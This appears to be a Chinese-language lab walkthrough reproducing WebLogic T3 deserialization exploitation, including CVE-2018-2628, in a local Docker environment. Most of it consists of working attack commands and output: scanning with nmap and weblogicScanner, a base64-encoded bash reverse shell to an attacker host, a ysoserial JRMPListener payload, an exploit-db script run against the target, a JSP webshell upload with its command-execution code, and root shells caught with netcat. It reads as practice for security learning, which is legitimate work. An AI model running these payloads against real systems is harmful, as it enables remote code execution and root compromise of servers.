

首先启动环境。因为我这里是一体化的环境，直接netstat -tunlp查看端口，可以看到7001端口是开放了的。

用nmap扫描：

```
nmap 127.0.0.1 -A
```

-A或者-sC都会使用默认脚本尝试，我们需要查看T3协议是否在使用。

注意这里要用回环地址，而不能使用本地局域网地址192.168.xx.xx。使用后者扫出来7001端口是filtered。这是docker环境限制的。

扫描结果如下：

```
7001/tcp open  http            Oracle WebLogic Server 10.3.6.0 (Servlet 2.5; JSP 2.1; T3 enabled)
|_http-title: Error 404--Not Found
|_weblogic-t3-info: T3 protocol in use (WebLogic version: 10.3.6.0)
```

也可以直接`-p 7001 --script=weblogic-t3-info`指定扫一下有没有使用T3协议。

还有一个工具是专门针对weblogic的，是weblogicScanner:https://github.com/rabbitmask

```
[*] =========Task Start=========
[+] [127.0.0.1:7001] Weblogic Version Is 10.3.6.0
[+] [127.0.0.1:7001] Weblogic console address is exposed! The path is: http://127.0.0.1:7001/console/login/LoginForm.jsp
[+] [127.0.0.1:7001] Weblogic UDDI module is exposed! The path is: http://127.0.0.1:7001/uddiexplorer/
[+] [127.0.0.1:7001] weblogic has a JAVA deserialization vulnerability:CVE-2016-0638
[-] [127.0.0.1:7001] weblogic not detected CVE-2016-3510
[+] [127.0.0.1:7001] weblogic has a JAVA deserialization vulnerability:CVE-2017-10271
[-] [127.0.0.1:7001] weblogic not detected CVE-2017-3248
[+] [127.0.0.1:7001] weblogic has a JAVA deserialization vulnerability:CVE-2017-3506
[-] [127.0.0.1:7001] weblogic not detected CVE-2018-2628
[-] [127.0.0.1:7001] weblogic not detected CVE-2018-2893
[-] [127.0.0.1:7001] weblogic not detected CVE-2018-2894
[+] [127.0.0.1:7001] weblogic has a JAVA deserialization vulnerability:CVE-2019-2725
[+] [127.0.0.1:7001] weblogic has a JAVA deserialization vulnerability:CVE-2019-2729
[+] [127.0.0.1:7001] weblogic has a JAVA deserialization vulnerability:CVE-2019-2890
[*] =========Task E n d=========

```

这次没扫出来是因为部分漏洞由于稳定性原因需要多次测试才可验证。多扫几次即可。

简单讲一下T3协议。正常java实现RMI（理解成面向对象的RPC）的底层协议是JRMP，但是weblogic比较特殊，使用的T3协议。这个协议会自动反序列化，且缺乏严格的类型检查，导致java反序列化漏洞。

java反序列化漏洞类似php反序列化漏洞，都是依靠反序列化时候自动触发的一些“魔术方法”执行恶意代码。java反序列化的利用链更加复杂，比如`common collections`（Apache Commons Collections是weblogic使用的一个第三方库，库中存在已知的危险类。）系列等。

## 一：传统利用jRMP

我们利用java反序列化漏洞的工具主要是`ysoserial`

同样要先先对反弹shell指令进行一个base64编码，便于传输。

```
bash -i >& /dev/tcp/127.0.0.1/2333 0>&1
编码如下：
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvMjMzMyAwPiYx
这里有一个问题，就是编码的payload前面要不要加bash -c?
标准写法是不加，经过了时间的检测。加了以后会嵌套一个bash，我试过不会出错，但是在复杂环境可以有问题，还是按照标准写法就好。
```

利用JRMP Listener开一个恶意JRMP服务器。

然后需要一个脚本，向T3协议发送触发JRMP的payload，让靶机向我们的攻击机发送jrmp请求（主要是做T3协议的握手，然后发反序列化字符串，包含一个在我们恶意JRMP服务器上的远程恶意类，靶机会自动请求）

参考链接：https://www.cnblogs.com/scivous/p/16035232.html

具体步骤如下：

先开启JRMP服务监听一个端口：

```
jdk8u412-b08/bin/java -cp ysoserial-all.jar ysoserial.exploit.JRMPListener 38080 CommonsCollections1 'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjU5LjEyOC8yMzMzIDA+JjE=}|{base64,-d}|{bash,-i}'
```

注意ysoserial工具需要java8环境，这里要手动指定一下。38080就是提供JRMP服务的端口。

然后在exploit-db上寻找利用脚本：https://www.exploit-db.com/exploits/44553

按照提示运行，但是如果直接运行，ysoserial会使用系统的高版本java生成payload。而这个脚本也不能指定java路径。因此我们需要切换java版本

````
└─# python2 exploit.py 127.0.0.1 7001 ../../jdk8u412-b08/bin/java ../../ysoserial-all.jar 192.168.59.128 38080 JRMPClient

Usage:
exploit.py [victim ip] [victim port] [path to ysoserial] [JRMPListener ip] [JRMPListener port] [JRMPClient]
````

```
export PATH=/home/orange/my_tools/jdk8u412-b08/bin:$PATH
```

临时切换使用export修改环境变量中的PATH即可，修改完`java -version`检查，成功修改了java版本

然后执行脚本,注意这里使用CommonsCollections1不成功，改用CommonsCollections2即可:

```
┌──(root㉿kali)-[/home/orange]
└─# nc -nlvp 2333
listening on [any] 2333 ...
connect to [192.168.59.128] from (UNKNOWN) [172.18.0.2] 40218
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
root@309b94b79d67:~/Oracle/Middleware/user_projects/domains/base_domain# ls
ls
autodeploy
bin
config
console-ext
fileRealm.properties
init-info
lib
security
servers
startWebLogic.sh
root@309b94b79d67:~/Oracle/Middleware/user_projects/domains/base_domain# 

```

## 二：上传webshell

原理是**将攻击载荷直接嵌入序列化数据中，而不是依赖远程加载恶意类**。利用了WebLogic内部的一些类来直接创建文件，比如`org.apache.commons.fileupload.disk.DiskFileItem`

githuburl:https://github.com/jas502n/CVE-2018-2628

```
┌──(root㉿kali)-[/home/orange/my_tools]
└─# python2 CVE-2018-2628-Getshell.py 127.0.0.1 7001 123456.jsp   

handshake successful

 >>>>usage: python cve-2018-2628.py ip port shell1.jsp 

>>>Shell File Upload Dir: 

servers\AdminServer\tmp\_WL_internal\bea_wls_internal\9j4dqk\war\123456.jsp

>>>Getshell: http://127.0.0.1:7001/bea_wls_internal/123456.jsp?tom=d2hvYW1pCg==

```

```
#先进入weblogic容器
docker-compose exec weblogic bash
#然后找一下我们的webshell有没有上传成功
root@14494e1a1081:/tmp# find / -name "123456.jsp" 2>/dev/null
/root/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/123456.jsp
```

根据脚本提示访问url：

![image-20250923124254826](C:\Users\zdx33\AppData\Roaming\Typora\typora-user-images\image-20250923124254826.png)

出现root字样是因为我们tom的payload是`whoami`指令的base64编码

这个webshell不太好利用，尝试蚁剑连接失败，同时反弹shell也失败。

docker中执行执行`bash -i >& /dev/tcp/192.168.59.128/2333 0>&1`是可以反弹的，但是写在webshell中就不行了。

估计是脚本问题，多次尝试发现管道符，重定向等都用不了。加上`bash -c`包裹后仍失效

上传的webshell关键部分如下：

```
byte[] binary = BASE64Decoder.class.newInstance().decodeBuffer(cmd);
String kcmd = new String(binary);
Process child = Runtime.getRuntime().exec(kcmd);
```

应该是直接调用Runtime.getRuntime().exec()导致的。但是按理说加上bash -c包裹就可以了

ok晚上突然想明白了。Runtime.getRuntime().exec()中就不能出现特殊符号，这就是为什么之前log4jshell要base64编码。

```
bash -c {echo,xxx}|{base64,-d}|{bash,-i}
```

老是顺着AI思路想，自己没有思考过。

这里尝试过修改脚本，但是webshell的一旦改变就无法上传。应该是有长度字段，但是脚本没注释，也没找到。

再把上面指令base64编码访问即可。

```
┌──(root㉿kali)-[/home/orange/my_tools/weblogic/CVE-2018-2628]
└─# nc -nlvp 2333
listening on [any] 2333 ...
connect to [192.168.59.128] from (UNKNOWN) [172.18.0.2] 36584
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
root@309b94b79d67:~/Oracle/Middleware/user_projects/domains/base_domain# 
```

除此之外还有就是利用weblogicTool这种图形化工具。首先环境配置很麻烦，要java8而且是有javaFX版本的。其次这种工具本质就是集合了几个漏洞的利用脚本。建议以后碰到漏洞自己尝试找脚本复现，锻炼自己能力。

